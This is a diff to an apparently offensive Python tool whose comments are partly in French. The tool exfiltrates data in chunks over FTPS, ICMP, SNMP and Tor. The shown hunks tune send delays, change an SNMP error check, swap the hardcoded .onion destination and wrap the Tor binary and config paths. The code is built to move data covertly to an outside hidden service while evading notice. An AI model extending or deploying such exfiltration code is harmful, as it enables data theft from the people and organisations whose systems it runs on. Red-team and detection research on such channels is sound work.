@@ -221,7 +221,7 @@ def envoyer_paquets_ftps(destination, parties):
             os.remove(filename)
         time.sleep(1)
 
-    ftps.quit()
+    ftps.close()
     print("[*] FTPS upload completed")
 
 # ========================
@@ -311,7 +311,7 @@ def envoyer_paquets_icmp(destination, parties, delai: float = 0.02):
 # EXFILTRATION SNMP
 # ========================
 
-async def envoyer_paquets_snmp(destination, parties, delai: float = 0.002):
+async def envoyer_paquets_snmp(destination, parties, delai: float = 0.02):
     engine = SnmpEngine()
     for idx, chunk in enumerate(tqdm(parties, desc="Envoi des paquets")):
         err_ind, err_stat, _, _ = await set_cmd(
@@ -324,7 +324,7 @@ async def envoyer_paquets_snmp(destination, parties, delai: float = 0.002):
                 OctetString(chunk)
             )
         )
-        if err_ind or err_stat:
+        if not (idx == len(parties) - 1) and (err_ind or err_stat):
             print("Error:", err_ind or err_stat.prettyPrint())
             return
         await asyncio.sleep(delai)
@@ -335,14 +335,14 @@ async def envoyer_paquets_snmp(destination, parties, delai: float = 0.002):
 # EXFILTRATION TOR (HTTP)
 # ========================
 
-ONION_ADDR = "uiarfeveadqaj3frrwlqomhgoywfdlujhw65jnzsyku7oqdlz4rwwnyd.onion"
-TORRC_PATH = "/etc/tor/torrc"
+ONION_ADDR = "pgv445u464p6mnxaxa6fmg6bat2yh5jpkcvoymwwnfdvzqpeamlvfdyd.onion"
+TORRC_PATH = resource_path("/etc/tor/torrc")
 
 async def envoyer_paquets_tor(destination, parties, delai: float = 2):
     system = platform.system()
     
     if system == "Linux":
-        process = subprocess.Popen(("sudo", "-u", "debian-tor", "tor", "-f", TORRC_PATH))
+        process = subprocess.Popen(("sudo", "-u", "debian-tor", resource_path("/usr/bin/tor"), "-f", TORRC_PATH))
         print("Waiting for Tor to bootstrap...")
         time.sleep(10)  # pour laisser le temps à Tor de se connecter
     
